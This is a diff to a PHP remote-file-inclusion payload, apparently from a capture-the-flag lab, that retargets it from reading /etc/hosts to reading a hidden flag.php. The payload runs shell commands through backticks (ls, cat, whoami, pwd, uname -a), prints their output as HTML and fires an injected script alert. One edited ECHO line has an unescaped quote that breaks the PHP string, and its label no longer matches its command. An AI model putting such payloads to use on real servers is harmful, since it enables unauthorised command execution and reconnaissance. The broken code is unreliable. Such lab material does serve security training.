@@ -4,7 +4,7 @@
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
     $ls_output = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
-    $catetchosts_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
+    $cat_flag_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $uname_a = `uname -a`;
@@ -12,16 +12,16 @@
     ECHO "<div><ol><li>Root file directory listing (\"ls /var/www/html/rfi2 /\")</li>";
     ECHO "<li>Who Am I: (\"whoami\")</li>";
     ECHO "<li>Present Working Directory: (\"pwd\")</li>";
-    ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
+    ECHO "<li>Display contents of /etc/hosts: (\"cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php")</li>";
     ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
-    ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
+    ECHO "<b><dl><dt>\"ls /var/www/html/rfi2/You_Cant_Find_This_Dir\" command:</dt></b>";
     ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
     ECHO "<dt><b>Who Am I?</b></dt>"; 
     ECHO "<dd>".$whoami_output. "</dd>";
     ECHO "<b><dt>Present Working Directory:</dt></b>";
     ECHO "<dd>".$pwd_output."</dd>";
     ECHO "<b><dt>Contents of /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php;</dt></b>";
-    ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
+    ECHO "<dd><pre>".$cat_flag_output."</pre></dd>";
     ECHO "<b><dt>uname -a:</b></dt>";
     ECHO "<dd>".$uname_a."</dd>";
     ECHO "<script>alert(\"Client Side Script Execution: \" + document.domain );var run = true</script><!--"
